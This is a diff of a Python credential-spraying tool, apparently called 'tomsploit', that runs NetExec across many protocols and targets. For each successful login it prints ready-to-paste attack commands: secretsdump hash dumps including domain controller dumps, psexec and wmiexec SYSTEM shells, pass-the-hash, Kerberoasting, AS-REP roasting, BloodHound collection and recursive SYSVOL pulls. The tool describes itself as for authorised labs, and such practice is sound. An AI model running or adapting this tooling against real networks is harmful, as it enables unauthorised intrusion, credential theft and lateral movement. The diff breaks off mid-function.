@@ -1,28 +1,12 @@
 #!/usr/bin/env python3
-"""netexec-automator — orchestrate nxc (NetExec) across multiple protocols,
-credential pairs, and targets.
+"""tomsploit — orchestrate nxc (NetExec) across protocols and targets.
 
-Designed as an enumeration helper for authorised engagements (e.g. OSCP labs).
-It does NOT perform exploitation automatically; on successful authentication
-it prints follow-up commands for the operator to run by hand.
+Enumeration helper for authorised engagements (e.g. OSCP labs). Sprays
+the same credential set against every available protocol, prints
+follow-up commands for any successful login, and never exploits anything
+automatically.
 """
-# MIT License
-# Copyright (c) 2026 Kazgangap
-# Modifications Copyright (c) 2026 twhitehead290
-# Additional modifications 2026 — refactor and feature improvements
-#
-# Permission is hereby granted, free of charge, to any person obtaining a copy
-# of this software and associated documentation files (the "Software"), to deal
-# in the Software without restriction, including without limitation the rights
-# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-# copies of the Software, and to permit persons to whom the Software is
-# furnished to do so, subject to the following conditions:
-#
-# The above copyright notice and this permission notice shall be included in
-# all copies or substantial portions of the Software.
-#
-# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND. SEE THE FULL
-# MIT LICENSE TEXT FOR DETAILS.
+# MIT License — see LICENSE block at end of file.
 
 import argparse
 import ipaddress
@@ -43,152 +27,44 @@ from datetime import datetime
 from enum import Enum
 from typing import Iterable
 
-# ─── ANSI Colors ────────────────────────────────────────────────────────
+# ─── Colors ────────────────────────────────────────────────────────────
 RED = GREEN = YELLOW = BLUE = CYAN = BOLD = DIM = RESET = ""
-
 _COLOR_CODES = {
-    "RED": "\033[91m",
-    "GREEN": "\033[92m",
-    "YELLOW": "\033[93m",
-    "BLUE": "\033[94m",
-    "CYAN": "\033[96m",
-    "BOLD": "\033[1m",
-    "DIM": "\033[2m",
-    "RESET": "\033[0m",
+    "RED": "\033[91m", "GREEN": "\033[92m", "YELLOW": "\033[93m",
+    "BLUE": "\033[94m", "CYAN": "\033[96m", "BOLD": "\033[1m",
+    "DIM": "\033[2m", "RESET": "\033[0m",
 }
 
 
 def configure_colors(no_color: bool) -> None:
-    """Enable ANSI colors unless --no-color or stdout is not a TTY."""
     if no_color or not sys.stdout.isatty():
         return
     for name, code in _COLOR_CODES.items():
         globals()[name] = code
 
 
-# ─── Protocol Configuration ─────────────────────────────────────────────
+# ─── Protocol config ───────────────────────────────────────────────────
 ALL_PROTOCOLS = ["smb", "ssh", "ldap", "ftp", "wmi", "winrm", "rdp", "vnc", "mssql", "nfs"]
 LOCAL_AUTH_PROTOCOLS = {"smb", "wmi", "winrm", "rdp", "mssql"}
 
-# Default TCP port for each protocol, used for the pre-flight port probe.
-# (NFS uses 2049 directly; nxc's nfs module probes that port.)
+# Default TCP port per protocol for the pre-flight probe.
 PROTOCOL_PORTS = {
-    "smb": 445,
-    "ssh": 22,
-    "ldap": 389,
-    "ftp": 21,
-    "wmi": 135,
-    "winrm": 5985,
-    "rdp": 3389,
-    "vnc": 5900,
-    "mssql": 1433,
-    "nfs": 2049,
+    "smb": 445, "ssh": 22, "ldap": 389, "ftp": 21, "wmi": 135,
+    "winrm": 5985, "rdp": 3389, "vnc": 5900, "mssql": 1433, "nfs": 2049,
 }
 
-# ─── Defaults ───────────────────────────────────────────────────────────
-DEFAULT_WORKERS = len(ALL_PROTOCOLS) + len(LOCAL_AUTH_PROTOCOLS)
-MAX_RETRY = 3
-SUBPROCESS_TIMEOUT = 45        # outer subprocess wall-clock timeout
-NETEXEC_TIMEOUT = 30           # nxc's own --timeout
-PORT_PROBE_TIMEOUT = 2.0       # per-port TCP connect timeout
-PORT_PROBE_WORKERS = 10
+# Which protocols accept which auth methods via nxc.
+# (Sending a hash to ssh/ftp/vnc/nfs makes nxc error.)
+WINDOWS_PROTOS = {"smb", "winrm", "wmi", "rdp", "mssql", "ldap"}
+
+DEFAULT_WORKERS = 15
+NETEXEC_TIMEOUT = 30
+SUBPROCESS_TIMEOUT = 45
+PORT_PROBE_TIMEOUT = 2.0
+MAX_CONSECUTIVE_TIMEOUTS = 3
 BANNER_WIDTH = 60
-PROGRESS_CLEAR_WIDTH = 70
-DEFAULT_MAX_CIDR_HOSTS = 1024  # safety cap for CIDR expansion
+DEFAULT_MAX_CIDR_HOSTS = 1024
 
-# ─── Command templates ──────────────────────────────────────────────────
-# Every {placeholder} is passed through shlex.quote() before substitution
-# (see shell_format). That handles passwords containing spaces, quotes,
-# backslashes, dollar signs, etc. — don't add hand-rolled single quotes
-# around placeholders here.
-
-COMMAND_TEMPLATES = {
-    "winrm": "evil-winrm -i {ip} -u {user} -p {password}",
-    "smb":   "impacket-psexec {connection_url_pw}",
-    "rdp":   "xfreerdp3 /u:{user} /p:{password} /d:{domain} /v:{ip} /dynamic-resolution /drive:share,/home/kali",
-    "wmi":   "impacket-wmiexec {connection_url_pw}",
-    "ssh":   "ssh {user}@{ip}",
-    "mssql": "impacket-mssqlclient {connection_url_pw} -windows-auth",
-    "ldap":  "ldapdomaindump -u {user_domain} -p {password} {ip}",
-}
-
-HASH_TEMPLATES = {
-    "winrm": "evil-winrm -i {ip} -u {user} -H {hash_nt}",
-    "smb":   "impacket-psexec {connection_url_hash} -hashes {hash_lmnt}",
-    "rdp":   "xfreerdp3 /u:{user} /pth:{hash_nt} /d:{domain} /v:{ip} /dynamic-resolution /drive:share,/home/kali",
-    "wmi":   "impacket-wmiexec {connection_url_hash} -hashes {hash_lmnt}",
-    "mssql": "impacket-mssqlclient {connection_url_hash} -hashes {hash_lmnt} -windows-auth",
-}
-
-DC_COMMAND_TEMPLATES = {
-    "ldap": [
-        ("BloodHound",     "bloodhound-python -u {user} -p {password} -d {domain} -dc {fqdn} -ns {ip} -c All --zip"),
-        ("getTGT",         "impacket-getTGT {domain}/{user}:{password}"),
-        ("ldapdomaindump", "ldapdomaindump -u {user_domain} -p {password} {ip}"),
-    ],
-    "smb": [
-        ("psexec",         "impacket-psexec {connection_url_pw}"),
-        ("smbexec",        "impacket-smbexec {connection_url_pw}"),
-        ("smbclient",      "smbclient -U {smb_userspec} //{ip}/SYSVOL"),
-    ],
-}
-
-DC_HASH_TEMPLATES = {
-    "ldap": [
-        ("secretsdump",    "impacket-secretsdump {connection_url_hash} -hashes {hash_lmnt}"),
-        ("getTGT",         "impacket-getTGT {domain}/{user} -hashes {hash_lmnt}"),
-    ],
-    "smb": [
-        ("psexec",         "impacket-psexec {connection_url_hash} -hashes {hash_lmnt}"),
-        ("secretsdump",    "impacket-secretsdump {connection_url_hash} -hashes {hash_lmnt}"),
-    ],
-}
-
-# Suggested next-step commands when anonymous SMB login succeeds.
-ANON_SMB_COMMANDS = [
-    ("smbclient (list shares)", "smbclient -L //{ip} -N"),
-    ("smbclient (connect)",     "smbclient //{ip}/<SHARE> -N"),
-    ("enum4linux",              "enum4linux -a {ip}"),
-    ("nmap smb-enum-shares",    "nmap --script smb-enum-shares,smb-enum-users -p 445 {ip}"),
-    ("nxc smb shares",          "nxc smb {ip} -u '' -p '' --shares"),
-]
-
-# ─── Output classification patterns ─────────────────────────────────────
-AUTH_RESPONSE_PATTERNS = (
-    "status_logon_failure",
-    "status_access_denied",
-    "rpc_s_access_denied",
-    "access denied",
-    "authentication failed",
-    "invalid credentials",
-    "bad credentials",
-    "permission denied",
-    "login failed",
-    "logon failure",
-)
-
-CONNECTIVITY_TIMEOUT_PATTERNS = (
-    "timed out",
-    "connection timeout",
-    "connection refused",
-    "connection reset",
-    "reset by peer",
-    "could not connect",
-    "connection error",
-    "host is unreachable",
-    "no route to host",
-    "network is unreachable",
-    "netbios connection",
-    "name or service not known",
-    "temporary failure in name resolution",
-    "broken pipe",
-    "errno 110",
-    "errno 111",
-    "errno 113",
-)
-
-
-# ─── Data model ─────────────────────────────────────────────────────────
 
 class AuthType(str, Enum):
     PASSWORD = "password"
@@ -197,23 +73,22 @@ class AuthType(str, Enum):
 
 
 @dataclass(frozen=True)
-class CredentialPair:
-    """One (user, secret, auth_type) tuple to try."""
+class Cred:
+    """One (user, secret, auth_type) tuple to test."""
     user: str
     secret: str
     auth_type: AuthType
 
     @property
-    def is_hash(self) -> bool:
-        return self.auth_type == AuthType.HASH
-
+    def is_hash(self) -> bool: return self.auth_type == AuthType.HASH
     @property
-    def is_kerberos(self) -> bool:
-        return self.auth_type == AuthType.KERBEROS
+    def is_kerberos(self) -> bool: return self.auth_type == AuthType.KERBEROS
 
 
 @dataclass
 class Success:
+    """A successful nxc [+] result. May represent a real cred or a Samba
+    guest-mapping pseudo-success (is_guest=True)."""
     protocol: str
     local_auth: bool
     domain: str
@@ -221,48 +96,43 @@ class Success:
     secret: str
     auth_type: AuthType
     is_admin: bool = False
+    is_guest: bool = False
     raw_message: str = ""
 
     @property
-    def scope(self) -> str:
-        return "local" if self.local_auth else "domain"
-
+    def is_hash(self) -> bool: return self.auth_type == AuthType.HASH
     @property
-    def label(self) -> str:
-        return f"{self.protocol.upper()} ({self.scope})"
+    def is_kerberos(self) -> bool: return self.auth_type == AuthType.KERBEROS
+    @property
+    def scope(self) -> str: return "local" if self.local_auth else "domain"
+    @property
+    def label(self) -> str: return f"{self.protocol.upper()} ({self.scope})"
 
 
 @dataclass
-class ProtocolResult:
-    protocol: str
-    local_auth: bool
-    status_lines: list[tuple[str, str]] = field(default_factory=list)  # (marker, msg)
-    target_info: str = ""
-    timeout_skipped: bool = False
-    successes: list[Success] = field(default_factory=list)
-
-
-@dataclass
-class TargetSummary:
+class TargetResult:
     target: str
     real_ip: str = ""
     hostname: str = ""
+    domain: str = ""        # AD domain from nxc info line (e.g. "DANTE.local")
     is_dc: bool = False
     elapsed: float = 0.0
-    open_protocols: set[str] = field(default_factory=set)
+    open_protocols: list[str] = field(default_factory=list)
     closed_protocols: list[str] = field(default_factory=list)
-    successes: list[Success] = field(default_factory=list)
-    anon_smb_success: bool = False
-    anon_smb_lines: list[tuple[str, str]] = field(default_factory=list)
-    protocol_results: list[ProtocolResult] = field(default_factory=list)
+    successes: list[Success] = field(default_factory=list)   # real creds
+    guests: list[Success] = field(default_factory=list)      # guest mappings
+    anon_smb: bool = False
+    anon_smb_lines: list[str] = field(default_factory=list)
+    protocol_lines: dict[str, list[tuple[str, str]]] = field(default_factory=dict)
+    target_info: str = ""
     scanned: bool = True
     skipped_reason: str = ""
 
 
-# ─── Module-level helpers ───────────────────────────────────────────────
+# ─── nxc output parsing ────────────────────────────────────────────────
 
 def parse_nxc_line(line: str) -> tuple[str | None, str]:
-    """Find an nxc status marker and return (marker, message)."""
+    """Find the first nxc marker on a line; return (marker, message)."""
     for marker in ("[+]", "[-]", "[*]", "[!]"):
         idx = line.find(marker)
         if idx != -1:
@@ -270,63 +140,531 @@ def parse_nxc_line(line: str) -> tuple[str | None, str]:
     return None, line.strip()
 
 
-def parse_nxc_credential_message(msg: str) -> tuple[str, str, str, bool]:
-    """Extract (domain, user, secret, is_admin) from an nxc [+] success message.
+def parse_success_message(msg: str) -> tuple[str, str, str, bool, bool]:
+    """Parse an nxc [+] message into (domain, user, secret, is_admin, is_guest).
 
-    Formats observed:
-        WORKGROUP\\admin:Password123
-        WORKGROUP\\admin:Password123 (Pwn3d!)
-        admin:Password123
-        WORKGROUP\\admin:aad3b...:31d6cfe0... (Pwn3d!)   # PtH
-
-    Notes:
-        * Splits on the FIRST ':' so passwords/hashes containing ':' are
-          preserved (NTLM LM:NT works).
-        * Strips a trailing "(...)" flag (e.g. (Pwn3d!), (adm)).
-        * A secret literally ending in "(stuff)" would be over-stripped, but
-          that case is vanishingly rare in practice.
+    Examples this handles:
+        WORKGROUP\\admin:Password123                       -> ('WORKGROUP','admin','Password123',False,False)
+        DANTE.local\\katwamba:Diablo5679 (Pwn3d!)           -> (...,True,False)
+        DANTE-NIX02\\admin:admin (Guest)                    -> (...,False,True)
+        WORKGROUP\\j:aad3b...:31d6cfe0... (Pwn3d!)          -> (...,True,False)
+        admin:Password123                                  -> ('','admin','Password123',False,False)
     """
     cleaned = msg.strip()
     is_admin = False
+    is_guest = False
 
+    # Strip a trailing parenthesised flag like (Pwn3d!), (adm), (Guest).
     m = re.search(r"\s*\(([^()]*)\)\s*$", cleaned)
     if m:
         flag = m.group(1).lower()
-        if any(tag in flag for tag in ("pwn3d", "adm")):
+        if "guest" in flag:
+            is_guest = True
+        elif "pwn3d" in flag or "adm" in flag:
             is_admin = True
         cleaned = cleaned[:m.start()].rstrip()
 
-    if not cleaned:
-        return "", "", "", is_admin
-    if ":" not in cleaned:
-        return "", cleaned, "", is_admin
+    if not cleaned or ":" not in cleaned:
+        return "", cleaned, "", is_admin, is_guest
 
     head, secret = cleaned.split(":", 1)
     if "\\" in head:
         domain, user = head.split("\\", 1)
     else:
         domain, user = "", head
-    return domain.strip(), user.strip(), secret, is_admin
+    return domain.strip(), user.strip(), secret, is_admin, is_guest
 
 
-def normalize_hash_forms(h: str | None) -> tuple[str, str]:
-    """Return (LM:NT, bare-NT) hash representations for command substitution."""
-    if not h:
-        return "<LM>:<NT>", "<NT>"
-    if ":" in h:
-        lm, nt = h.split(":", 1)
-        return f"{lm}:{nt}", nt
-    return f":{h}", h
+def extract_ipv4(text: str) -> str | None:
+    m = re.search(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", text)
+    return m.group(0) if m else None
 
 
-def expand_targets(specs: Iterable[str],
-                   max_cidr_hosts: int = DEFAULT_MAX_CIDR_HOSTS) -> list[str]:
-    """Expand a mixed iterable of IPs, hostnames and CIDRs into a deduplicated
-    list of host strings, preserving input order.
+def looks_like_dc(target_info: str) -> bool:
+    """Heuristic DC detection from nxc's info line (e.g. 'name:DC01')."""
+    if not target_info:
+        return False
+    m = re.search(r"name:([^\s)]+)", target_info, re.IGNORECASE)
+    if not m:
+        return False
+    hostname = m.group(1).lower()
+    return bool(re.search(r"\bdc\d*\b|^dc|pdc|addc", hostname))
 
-    Raises ValueError if a single CIDR expands beyond max_cidr_hosts. The cap
-    can be raised via the --max-cidr-hosts CLI flag.
+
+def extract_hostname(target_info: str) -> str:
+    m = re.search(r"name:([^\s)]+)", target_info, re.IGNORECASE)
+    return m.group(1).upper() if m else ""
+
+
+def extract_domain(target_info: str) -> str:
+    """Pull the AD domain from nxc's [*] info line (e.g. 'domain:DANTE.local')."""
+    m = re.search(r"domain:([^\s)]+)", target_info, re.IGNORECASE)
+    return m.group(1) if m else ""
+
+
+# ─── Suggested-command rendering ───────────────────────────────────────
+# All values that get substituted into command templates pass through
+# shlex.quote(), so passwords with spaces, quotes, $, etc. paste safely.
+
+def q(v: str | None) -> str:
+    """shlex.quote with a sane handling of None/empty."""
+    if v is None or v == "":
+        return "''"
+    return shlex.quote(str(v))
+
+
+def build_suggestions(s: Success, ip: str, hostname: str, is_dc: bool,
+                      extra_hash: str | None) -> list[tuple[str, str]]:
+    """Return [(sub_label, command_string), ...] of follow-up commands for
+    a successful login.
+
+    Guarantees:
+      * Never raises — invalid inputs produce an empty list rather than
+        breaking the report.
+      * Every {placeholder} is shell-safe via shlex.quote.
+      * Returns at least one entry for any (protocol, auth_type) we know
+        about.
     """
+    proto = s.protocol
+    user = s.user or ""
+    domain = s.domain or ""
+    secret = s.secret or ""
+    # The "hash to use" in PtH suggestions: prefer the success's own
+    # secret if it IS a hash, otherwise fall back to -H if the user gave one.
+    pth_hash = secret if s.is_hash else (extra_hash or "")
+
+    # Build qP/qH versions of common args.
+    qip   = q(ip)
+    quser = q(user)
+    qpw   = q(secret) if not s.is_hash else "''"
+    qdom  = q(domain) if domain else "''"
+    # impacket-style URL: DOMAIN/user:pw@ip — quote the whole thing as one piece
+    if domain:
+        url_pw   = f"{domain}/{user}:{secret}@{ip}"
+        url_nopw = f"{domain}/{user}@{ip}"
+    else:
+        url_pw   = f"{user}:{secret}@{ip}"
+        url_nopw = f"{user}@{ip}"
+    qurl_pw   = q(url_pw)
+    qurl_nopw = q(url_nopw)
+    qhost     = q(hostname or ip)
+    qfqdn     = q(f"{hostname}.{domain}" if hostname and domain else (hostname or ip))
+    qhash     = q(pth_hash) if pth_hash else "''"
+    # SMB-style user spec for smbclient: DOMAIN\user%password
+    if domain and not s.is_hash:
+        qsmb_user = q(f"{domain}\\{user}%{secret}")
+    elif not s.is_hash:
+        qsmb_user = q(f"{user}%{secret}")
+    else:
+        qsmb_user = q(f"{domain}\\{user}" if domain else user)
+
+    entries: list[tuple[str, str]] = []
+
+    # Password-based suggestions
+    if s.auth_type == AuthType.PASSWORD:
+        if proto == "smb":
+            if is_dc:
+                # DC + SMB creds → domain hash dump and share recon.
+                # crackmapexec --shares lists what's actually available;
+                # then pick a share to browse with smbclient (interactive).
+                # LDAP block deliberately omits secretsdump to avoid
+                # duplication when both protocols succeed (common).
+                entries += [
+                    ("crackmapexec --shares",
+                        f"crackmapexec smb {qip} -u {quser} -p {qpw} --shares"),
+                    ("secretsdump -just-dc",
+                        f"impacket-secretsdump -just-dc {qurl_pw}"),
+                    ("smbclient (interactive)",
+                        f"smbclient //{ip}/<SHARE> -U {qsmb_user}"),
+                ]
+            else:
+                # Non-DC SMB: enumerate shares + dump local hashes.
+                entries += [
+                    ("enum4linux-ng",
+                        f"enum4linux-ng -A -u {quser} -p {qpw} {qip}"),
+                    ("crackmapexec --shares",
+                        f"crackmapexec smb {qip} -u {quser} -p {qpw} --shares"),
+                    ("secretsdump (SAM+LSA+cached)",
+                        f"impacket-secretsdump {qurl_pw}"),
+                    ("psexec (SYSTEM shell)",
+                        f"impacket-psexec {qurl_pw}"),
+                    ("smbclient (interactive)",
+                        f"smbclient //{ip}/<SHARE> -U {qsmb_user}"),
+                ]
+        elif proto == "winrm":
+            # "More reliable than PSSession" per OSCP notes.
+            entries.append(("evil-winrm",
+                f"evil-winrm -i {qip} -u {quser} -p {qpw}"))
+        elif proto == "wmi":
+            entries.append(("wmiexec",
+                f"impacket-wmiexec {qurl_pw}"))
+        elif proto == "rdp":
+            # Share-mount included for trivial file transfer back to Kali.
+            entries.append(("xfreerdp3 (+share mount)",
+                f"xfreerdp3 /u:{quser} /p:{qpw} /d:{qdom} /v:{qip} "
+                f"/dynamic-resolution /drive:share,/home/kali /cert:ignore"))
+        elif proto == "mssql":
+            # Two entries: the client, then the xp_cmdshell SQL block
+            # (rendered as a multi-line note, not a shell command).
+            entries.append(("mssqlclient",
+                f"impacket-mssqlclient {qurl_pw} -windows-auth"))
+        elif proto == "ldap":
+            if is_dc:
+                # LDAP block focuses on AD enumeration. secretsdump lives
+                # in the SMB block when SMB also succeeds — avoiding dup.
+                entries += [
+                    ("kerbrute userenum",
+                        f"kerbrute userenum --dc {qip} -d {qdom} "
+                        f"/usr/share/seclists/Usernames/Names/names.txt"),
+                    ("AS-REP roast",
+                        f"impacket-GetNPUsers {qdom}/{quser}:{qpw} "
+                        f"-request -format hashcat -outputfile asrep.hash "
+                        f"-dc-ip {qip}"),
+                    ("Kerberoast (SPN tickets)",
+                        f"impacket-GetUserSPNs -request -dc-ip {qip} "
+                        f"{qdom}/{quser}:{qpw} -outputfile kerb.hash"),
+                    ("BloodHound",
+                        f"bloodhound-python -u {quser} -p {qpw} -d {qdom} "
+                        f"-dc {qfqdn} -ns {qip} -c All --zip"),
+                    ("ldapdomaindump",
+                        f"ldapdomaindump -u "
+                        f"{q(domain + chr(92) + user) if domain else quser} "
+                        f"-p {qpw} {qip}"),
+                ]
+            else:
+                entries.append(("ldapdomaindump",
+                    f"ldapdomaindump -u "
+                    f"{q(domain + chr(92) + user) if domain else quser} "
+                    f"-p {qpw} {qip}"))
+        elif proto == "ssh":
+            entries.append(("ssh (no host-key prompts)",
+                f"ssh -o UserKnownHostsFile=/dev/null "
+                f"-o StrictHostKeyChecking=no {q(user + '@' + ip)}"))
+        elif proto == "ftp":
+            entries += [
+                ("ftp (active mode)",
+                    f"ftp -A {qip}"),
+                ("wget (recursive pull)",
+                    f"wget -r ftp://{q(user)}:{q(secret)}@{ip}/"),
+            ]
+        elif proto == "vnc":
+            entries.append(("vncviewer",
+                f"vncviewer {qip}"))
+        elif proto == "nfs":
+            entries += [
+                ("showmount -e",
+                    f"showmount -e {qip}"),
+                ("mount NFS export",
+                    f"sudo mkdir -p /mnt/nfs && "
+                    f"sudo mount -t nfs -o nolock,vers=3 "
+                    f"{ip}:<EXPORT> /mnt/nfs"),
+            ]
+
+    # ─── Hash-based suggestions (Pass-the-Hash) ────────────────────────
+    elif s.auth_type == AuthType.HASH:
+        hash_arg = q(pth_hash) if pth_hash else "NT"
+        if proto == "smb":
+            if is_dc:
+                entries += [
+                    ("crackmapexec --shares [PtH]",
+                        f"crackmapexec smb {qip} -u {quser} -H {qhash} --shares"),
+                    ("secretsdump -just-dc [PtH]",
+                        f"impacket-secretsdump -just-dc {qurl_nopw} "
+                        f"-hashes :{hash_arg}"),
+                    ("psexec [PtH]",
+                        f"impacket-psexec {qurl_nopw} -hashes :{hash_arg}"),
+                ]
+            else:
+                entries += [
+                    ("crackmapexec --shares [PtH]",
+                        f"crackmapexec smb {qip} -u {quser} -H {qhash} --shares"),
+                    ("secretsdump (SAM+LSA) [PtH]",
+                        f"impacket-secretsdump {qurl_nopw} -hashes :{hash_arg}"),
+                    ("psexec [PtH]",
+                        f"impacket-psexec {qurl_nopw} -hashes :{hash_arg}"),
+                    ("wmiexec [PtH]",
+                        f"impacket-wmiexec {qurl_nopw} -hashes :{hash_arg}"),
+                ]
+        elif proto == "winrm":
+            entries.append(("evil-winrm [PtH]",
+                f"evil-winrm -i {qip} -u {quser} -H {qhash}"))
+        elif proto == "wmi":
+            entries.append(("wmiexec [PtH]",
+                f"impacket-wmiexec {qurl_nopw} -hashes :{hash_arg}"))
+        elif proto == "rdp":
+            entries.append(("xfreerdp3 [PtH]",
+                f"xfreerdp3 /u:{quser} /pth:{qhash} /d:{qdom} /v:{qip} "
+                f"/dynamic-resolution /drive:share,/home/kali /cert:ignore"))
+        elif proto == "mssql":
+            entries.append(("mssqlclient [PtH]",
+                f"impacket-mssqlclient {qurl_nopw} -hashes :{hash_arg} "
+                f"-windows-auth"))
+        elif proto == "ldap" and is_dc:
+            entries += [
+                ("BloodHound [PtH]",
+                    f"bloodhound-python -u {quser} --hashes :{hash_arg} "
+                    f"-d {qdom} -dc {qfqdn} -ns {qip} -c All --zip"),
+                ("Kerberoast [PtH]",
+                    f"impacket-GetUserSPNs -request -dc-ip {qip} "
+                    f"-hashes :{hash_arg} {qdom}/{quser} "
+                    f"-outputfile kerb.hash"),
+            ]
+        elif proto == "ldap":
+            entries.append(("getTGT (then use as -k)",
+                f"impacket-getTGT {qdom}/{quser} -hashes :{hash_arg}"))
+
+    # ─── Kerberos ticket-cache suggestions ─────────────────────────────
+    elif s.auth_type == AuthType.KERBEROS:
+        if proto == "smb":
+            entries.append(("psexec -k",
+                f"impacket-psexec -k -no-pass {qurl_nopw}"))
+            if is_dc:
+                entries.append(("secretsdump -just-dc -k",
+                    f"impacket-secretsdump -just-dc -k -no-pass {qurl_nopw}"))
+        elif proto == "winrm":
+            entries.append(("evil-winrm -r",
+                f"evil-winrm -i {qip} -u {quser} -r {qdom}"))
+        elif proto == "ldap" and is_dc:
+            entries.append(("BloodHound -k",
+                f"bloodhound-python -u {quser} -k --no-pass "
+                f"-d {qdom} -dc {qfqdn} -ns {qip} -c All --zip"))
+
+    return entries
+
+
+# ─── Display ───────────────────────────────────────────────────────────
+
+ANON_SMB_COMMANDS = [
+    ("list shares",          "smbclient -L //{ip} -N"),
+    ("connect to a share",   "smbclient //{ip}/<SHARE> -N"),
+    ("enum4linux-ng",        "enum4linux-ng -A {ip}"),
+    ("crackmapexec shares",  "crackmapexec smb {ip} -u '' -p '' --shares"),
+    ("recursive pull SYSVOL", "smbclient //{ip}/SYSVOL -N -c 'recurse ON; prompt OFF; mget *'"),
+]
+
+
+def print_anon_smb_commands(ip: str) -> None:
+    print(f"\n  {CYAN}{BOLD}💡 Anonymous SMB — Suggested Next Steps{RESET}")
+    print(f"  {'─' * (BANNER_WIDTH - 2)}")
+    for i, (label, tmpl) in enumerate(ANON_SMB_COMMANDS):
+        if i > 0:
+            print()
+        print(f"        {DIM}# {label}{RESET}")
+        print(f"        {tmpl.format(ip=ip)}")
+    print()
+
+
+def print_suggested_commands(result: TargetResult, extra_hash: str | None) -> None:
+    """Render the headline section: one block per (protocol, auth_type)
+    combination that produced a real success."""
+    if not result.successes:
+        return
+
+    # Group by (protocol, auth_type) so a host with both password and hash
+    # success on SMB doesn't print duplicate blocks.
+    seen: set[tuple[str, AuthType]] = set()
+    blocks: list[tuple[Success, list[tuple[str, str]]]] = []
+    # Sort by canonical protocol order so output is stable across runs.
+    def sort_key(s: Success) -> tuple[int, int]:
+        try:
+            return (ALL_PROTOCOLS.index(s.protocol), int(s.local_auth))
+        except ValueError:
+            return (len(ALL_PROTOCOLS), int(s.local_auth))
+    for s in sorted(result.successes, key=sort_key):
+        key = (s.protocol, s.auth_type)
+        if key in seen:
+            continue
+        seen.add(key)
+        try:
+            entries = build_suggestions(
+                s, ip=result.real_ip or result.target,
+                hostname=result.hostname,
+                is_dc=result.is_dc,
+                extra_hash=extra_hash,
+            )
+        except Exception as exc:
+            # build_suggestions promises not to raise, but defence in depth:
+            # a single broken suggestion must never hide the others.
+            entries = [("error",
+                        f"# suggestion builder failed: "
+                        f"{exc.__class__.__name__}: {exc}")]
+        if entries:
+            blocks.append((s, entries))
+
+    if not blocks:
+        return
+
+    dc_tag = f" {YELLOW}[DC]{RESET}" if result.is_dc else ""
+    print(f"  {CYAN}{BOLD}💡 Suggested Commands{RESET}{dc_tag}")
+    print(f"  {'─' * (BANNER_WIDTH - 2)}")
+    for s, entries in blocks:
+        # Protocol heading
+        header = f"[{s.protocol.upper()}"
+        if s.auth_type == AuthType.HASH:
+            header += " · PtH"
+        elif s.auth_type == AuthType.KERBEROS:
+            header += " · Kerberos"
+        header += "]"
+        print(f"\n    {GREEN}►{RESET} {BOLD}{header}{RESET}")
+
+        # One entry = one labelled command on its own line, with a blank
+        # line between entries so nothing visually runs together.
+        for i, (sub_label, cmd) in enumerate(entries):
+            if i > 0:
+                print()
+            print(f"        {DIM}# {sub_label}{RESET}")
+            print(f"        {cmd}")
+    print()
+
+
+def print_target_header(target: str) -> None:
+    print(f"  {GREEN}{BOLD}► {target}{RESET}")
+
+
+def print_port_probe(result: TargetResult, quiet: bool) -> None:
+    if quiet or not result.closed_protocols:
+        return
+    n_open = len(result.open_protocols)
+    n_total = n_open + len(result.closed_protocols)
+    skipped = ", ".join(p.upper() for p in result.closed_protocols)
+    print(f"    {DIM}↳ Port probe: {n_open}/{n_total} open · skipping {skipped}{RESET}\n")
+
+
+def status_icon(lines: list[tuple[str, str]]) -> str:
+    has_success = any(m == "[+]" for m, _ in lines)
+    has_skip = any(m == "[!]" for m, _ in lines)
+    if has_success: return f"{GREEN}✔{RESET}"
+    if has_skip:    return f"{YELLOW}⏱{RESET}"
+    return f"{RED}✘{RESET}"
+
+
+def print_protocol_results(result: TargetResult, quiet: bool) -> None:
+    ip_tag = (f" {DIM}({result.real_ip}){RESET}"
+              if result.real_ip and result.real_ip != result.target else "")
+    dc_tag = f" {YELLOW}{BOLD}[DC]{RESET}" if result.is_dc else ""
+    elapsed_tag = f" {DIM}[{result.elapsed:.1f}s]{RESET}" if result.elapsed > 0 else ""
+
+    print(f"\n{'─' * BANNER_WIDTH}")
+    print(f"  {CYAN}{BOLD}📋 Results{RESET}{ip_tag}{dc_tag}{elapsed_tag}")
+    print(f"{'─' * BANNER_WIDTH}")
+
+    if result.target_info and not quiet:
+        print(f"    {DIM}{result.target_info}{RESET}")
+    print()
+
+    # Anonymous SMB
+    if result.anon_smb_lines:
+        anon_parsed = [(m, msg) for m, msg in
+                       [parse_nxc_line(l) for l in result.anon_smb_lines]
+                       if m in ("[+]", "[-]", "[!]")]
+        if anon_parsed:
+            icon = status_icon(anon_parsed)
+            first = True
+            for marker, msg in anon_parsed:
+                prefix = (f"  {icon} {BOLD}{'SMB (anon)':<20}{RESET}" if first
+                          else f"      {'':<20}")
+                first = False
+                if marker == "[+]":
+                    print(f"{prefix} {YELLOW}{msg}{RESET}")
+                elif marker == "[-]" and not quiet:
+                    print(f"{prefix} {DIM}{msg}{RESET}")
+                elif marker == "[!]":
+                    print(f"{prefix} {YELLOW}{msg}{RESET}")
+
+    # Per-protocol blocks (keep canonical order)
+    quiet_protos: list[str] = []
+    for proto in ALL_PROTOCOLS:
+        for scope in (False, True):
+            key = f"{proto}-{'local' if scope else 'domain'}"
+            lines = result.protocol_lines.get(key)
+            if not lines:
+                continue
+            if not any(m in ("[+]", "[-]", "[!]") for m, _ in lines):
+                quiet_protos.append(f"{proto.upper()} ({'local' if scope else 'domain'})")
+                continue
+            label = f"{proto.upper()} ({'local' if scope else 'domain'})"
+            icon = status_icon(lines)
+            first = True
+            for marker, msg in lines:
+                if marker not in ("[+]", "[-]", "[!]"):
+                    continue
+                prefix = (f"  {icon} {BOLD}{label:<20}{RESET}" if first
+                          else f"      {'':<20}")
+                first = False
+                if marker == "[+]":
+                    print(f"{prefix} {GREEN}{msg}{RESET}")
+                elif marker == "[-]" and not quiet:
+                    print(f"{prefix} {DIM}{msg}{RESET}")
+                elif marker == "[!]":
+                    print(f"{prefix} {YELLOW}{msg}{RESET}")
+
+    if quiet_protos and not quiet:
+        print(f"\n  {DIM}── No findings: {', '.join(quiet_protos)}{RESET}")
+    print(f"\n{'─' * BANNER_WIDTH}")
+
+
+def print_valid_section(result: TargetResult, extra_hash: str | None,
+                        quiet: bool) -> None:
+    has_anything = (result.successes or result.guests or result.anon_smb)
+    if not has_anything:
+        if not quiet:
+            print(f"\n  {RED}{BOLD}✗ No valid credentials found.{RESET}\n")
+        print(f"{'═' * BANNER_WIDTH}\n")
